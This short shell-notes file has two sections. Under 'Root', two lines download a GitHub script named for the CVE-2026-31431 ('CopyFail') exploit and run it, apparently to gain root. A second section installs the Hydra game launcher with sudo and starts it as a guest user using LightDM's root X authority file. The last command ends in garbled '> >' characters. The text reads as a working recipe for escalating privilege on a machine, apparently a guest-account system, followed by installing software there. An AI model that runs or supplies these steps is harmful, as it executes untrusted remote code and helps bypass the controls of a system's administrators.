# Root
```bash
wget https://raw.githubusercontent.com/ZephrFish/CopyFail-CVE-2026-31431/refs/heads/main/copyfail.py
python3 copyfail.py
```
### Hidra launcher dowload
```bash
cd ~/Downloads
wget https://github.com/hydralauncher/hydra/releases/download/v4.4.0/hydralauncher_4.4.0_amd64.deb
sudo apt install ./hydralauncher_4.4.0_amd64.deb
runuser -u guest-eieozj -- env \
DISPLAY=:0 \
XAUTHORITY=/var/run/lightdm/root/:0 \
/opt/Hydra/hydralauncher> >
```
